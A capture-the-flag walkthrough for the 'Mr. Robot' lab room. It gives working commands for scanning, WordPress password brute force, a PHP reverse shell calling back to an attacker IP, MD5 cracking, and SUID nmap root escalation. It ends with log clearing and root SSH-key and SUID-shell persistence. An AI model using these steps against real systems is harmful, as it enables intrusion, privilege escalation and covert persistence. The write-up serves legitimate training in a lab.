CTF Information
Category	Details
Platform	TryHackMe / VulnHub
Room Name	Mr. Robot
Difficulty	Medium
Theme	Inspired by the TV show "Mr. Robot"
Goal	Capture 3 flags (key-1-of-3.txt, key-2-of-3.txt, key-3-of-3.txt)
Flag Format	MD5 hashes (e.g., 073403c8a58a1f80d943455fb30724b9) # Mr.ROBOT-CTF


PHASE 1: RECONNAISSANCE
1.1 Network Scanning (Nmap)
First, we identify open ports and running services on the target machine.

bash
# Fast scan for open ports (SYN scan, high rate)
nmap -p- --open -sS -Pn --min-rate 5000 -v -n <target-ip>

# Detailed service and script scan on discovered ports
nmap -sV -sC -p 80,443,22 <target-ip> -oN nmap_scan.txt
Results:

text
PORT    STATE  SERVICE  VERSION
22/tcp  open   ssh      OpenSSH
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-title: 400 Bad Request
``` [citation:2][citation:9]

**Key Observations:**
- Ports **80 (HTTP)** and **443 (HTTPS)** are open → web server running
- Port **22 (SSH)** is open → possible later access
- No SSH credentials yet

---

## 1.2 Web Enumeration

### Initial Website Check

Visit `http://<target-ip>` in browser. The page shows an animated command-line interface with interactive commands (`fsociety`, `inform`, `join`, etc.), but none reveal immediate information [citation:1].

**Check Page Source:**
```bash
curl http://<target-ip> | grep -i "hidden\|key\|flag"
No immediate flags, but always check manually for comments.

🚩 PHASE 2: FINDING FLAG 1
2.1 robots.txt Discovery
A common first step is checking /robots.txt:

bash
curl http://<target-ip>/robots.txt
Output:

text
User-agent: *
fsocity.dic
key-1-of-3.txt
``` [citation:1][citation:2][citation:3]

This reveals two files:
1. `key-1-of-3.txt` → **First flag**
2. `fsocity.dic` → Wordlist for later brute-forcing

## 2.2 Retrieve Flag 1

```bash
# Download the first flag
wget http://<target-ip>/key-1-of-3.txt
cat key-1-of-3.txt
Flag 1 (example):

text
073403c8a58a1f80d943455fb30724b9
``` [citation:9]

> ⚠️ **Note:** The actual hash value is unique to your machine instance. The above is an example from a walkthrough. Your flag will be different.

## 2.3 Download the Dictionary

```bash
wget http://<target-ip>/fsocity.dic
Check the wordlist size:

bash
wc -l fsocity.dic
Output: 858160 fsocity.dic — over 858,000 words 

📂 PHASE 3: DIRECTORY ENUMERATION
3.1 Gobuster Scan
We need to find hidden directories, especially the WordPress admin panel.

bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -t 50
Interesting findings:

/wp-admin (301)

/wp-login.php (200)

/wp-content (301)

/wp-includes (301)

/robots (200)

/license (200)

/readme (200) 

This confirms the site is running WordPress (likely version 4.3.1).

3.2 Check /license Page
bash
curl http://<target-ip>/license
Scrolling to the bottom reveals a base64-encoded string:

text
ZWxsaW90OkVSMjgtMDY1Mgo=
``` [citation:9]

Decode it:
```bash
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
Output:

text
elliot:ER28-0652
``` [citation:9]

🎉 We now have **credentials**:
- Username: `elliot`
- Password: `ER28-0652`

---

# 🔓 PHASE 4: WORDPRESS LOGIN & USER ENUMERATION

## 4.1 WordPress Login Page

Navigate to:
http://<target-ip>/wp-login.php

text

Login with `elliot / ER28-0652`. Success — we are logged in as an administrator [citation:1][citation:9].

## 4.2 User Enumeration with WPScan

Alternatively, we can use WPScan to enumerate valid users:

```bash
wpscan --url http://<target-ip> --enumerate u
This reveals the username elliot.

4.3 Brute-Forcing Password (Alternative Method)
If credentials weren't found in /license, we could brute-force using the fsocity.dic wordlist.

First, deduplicate the wordlist:

bash
sort fsocity.dic | uniq > fsocity-sorted.dic
Brute-force with WPScan:

bash
wpscan --url http://<target-ip> --usernames elliot --passwords fsocity-sorted.dic
Or with Hydra:

bash
hydra -L fsocity-sorted.dic -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
``` [citation:1][citation:2]

This would eventually crack the password `ER28-0652`.

---

# 💀 PHASE 5: GAINING REVERSE SHELL

## 5.1 Prepare Reverse Shell Payload

We'll use the **PentestMonkey PHP reverse shell**.

Download it:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Edit the file to set your IP and port:

php
$ip = 'YOUR_ATTACKER_IP';   // Change to your Kali IP
$port = 4444;               // Change to your listening port
5.2 Upload via WordPress Theme Editor
In WordPress admin panel, go to Appearance → Theme Editor 

Select the 404 Template (404.php) — this is safe because it won't break the site

Replace the entire content with your reverse shell code

Click Update File 

5.3 Start Netcat Listener
On your attacker machine:

bash
nc -lvnp 4444
5.4 Trigger the Reverse Shell
Visit the 404 page to execute the payload:

bash
curl http://<target-ip>/wp-content/themes/twentyfifteen/404.php
Alternatively, browse to any non-existent page like:

text
http://<target-ip>/random-page-that-doesnt-exist
5.5 Shell Obtained!
Check your Netcat listener — you should have a connection as the daemon user.

bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.x.x.x] from (UNKNOWN) [10.x.x.x] 54321
Linux linux 3.13.0-55-generic #94-Ubuntu SMP ...
daemon@linux:/$
``` [citation:9]

---

# 🔧 PHASE 6: SHELL UPGRADE

The initial shell is very limited. Upgrade to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
``` [citation:1][citation:9]

---

# 🚩 PHASE 7: FINDING FLAG 2

## 7.1 Explore Home Directories

```bash
ls -la /home
Output:

text
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
``` [citation:9]

## 7.2 Check Robot User's Directory

```bash
ls -la /home/robot
Output:

text
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
``` [citation:9]

## 7.3 Read Password Hash

```bash
cat /home/robot/password.raw-md5
Output:

text
robot:c3fcd3d76192e4007dfb496cca67e13b
``` [citation:9]

## 7.4 Crack the MD5 Hash

The hash format is `username:md5_hash`. We need to crack `c3fcd3d76192e4007dfb496cca67e13b`.

**Method 1 — CrackStation (online):**
Visit https://crackstation.net/ and paste the hash. It reveals: `abcdefghijklmnopqrstuvwxyz` [citation:1]

**Method 2 — John the Ripper:**
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
7.5 Switch to Robot User
bash
su robot
Password: abcdefghijklmnopqrstuvwxyz
Now read Flag 2:

bash
cat /home/robot/key-2-of-3.txt
Flag 2 (example):

text
fc62c281e015098330a372ad7b98f836
``` [citation:1]

---

# 👑 PHASE 8: PRIVILEGE ESCALATION TO ROOT (FLAG 3)

## 8.1 Find SUID Binaries

Now as `robot`, look for binaries with the SUID bit set — these run with the owner's privileges.

```bash
find / -perm -4000 -type f 2>/dev/null
Key finding: nmap appears in the list with SUID permissions 

bash
which nmap
/usr/local/bin/nmap
ls -la /usr/local/bin/nmap
-rwsr-xr-x 1 root root 4489480 Nov 13  2015 /usr/local/bin/nmap
The s in rws indicates SUID is set — nmap runs as root when executed by any user!

8.2 Exploit Nmap Interactive Mode
Nmap versions before 6.40 have an interactive mode that allows command execution .

bash
nmap --interactive
This launches an Nmap interactive shell. Type:

text
nmap> !sh
You are now root! 

bash
whoami
root
8.3 Alternative SUID Exploit Method
If interactive mode is not available, you can use the --script parameter:

bash
nmap --script=shell
Or write a script to spawn a shell:

bash
echo 'os.execute("/bin/sh")' > shell.nse
nmap --script=shell.nse
8.4 Capture Flag 3
Navigate to the root directory:

bash
cd /root
ls -la
cat key-3-of-3.txt
Flag 3 (example):

text
0474afefec71efedf5410ec47d9acf1e
``` [citation:1]

---

## 8.5 Alternative Privilege Escalation Path

If the SUID `nmap` method fails, other escalation vectors exist:

### Check for world-writable files:
```bash
find / -writable -type f 2>/dev/null | grep -v proc
Check cron jobs:
bash
cat /etc/crontab
Check sudo permissions:
bash
sudo -l
📋 PHASE 9: POST-EXPLOITATION
9.1 Clear Logs (If Needed)
bash
cat /dev/null > ~/.bash_history
history -c
9.2 Persistence Options
If you want to maintain access:

bash
# Add a root SSH key
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys

# Or create a SUID binary
cp /bin/bash /tmp/rootshell
chmod +xs /tmp/rootshell


Tools Used
Tool	Purpose
nmap	Port and service scanning
gobuster / dirb	Directory brute-forcing
WPScan	WordPress vulnerability enumeration
hydra	Password brute-forcing
BurpSuite	Intercepting web traffic
nc (netcat)	Reverse shell listener
python -c 'import pty; pty.spawn("/bin/bash")'	Shell upgrade
